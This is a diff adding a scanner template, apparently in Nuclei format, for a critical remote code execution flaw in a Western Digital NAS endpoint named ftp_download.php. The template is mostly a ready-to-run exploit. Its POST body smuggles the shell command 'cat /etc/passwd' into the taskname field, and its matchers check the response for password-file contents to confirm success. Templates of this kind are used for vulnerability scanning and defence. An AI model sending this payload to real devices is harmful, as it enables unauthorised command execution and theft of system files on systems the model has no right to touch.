@@ -1,0 +1,31 @@
+id: poc-yaml-west-nas-ftp-download-php-rce
+info:
+  name: Western Digital NAS ftp_download.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "/web/addons/ftp_download.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=create&taskname=";cat%20/etc/passwd;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "\"success\":true"
+          - "ftp_download.php"
+      - type: word
+        part: body
+        words:
+          - "<html"
+        negative: true
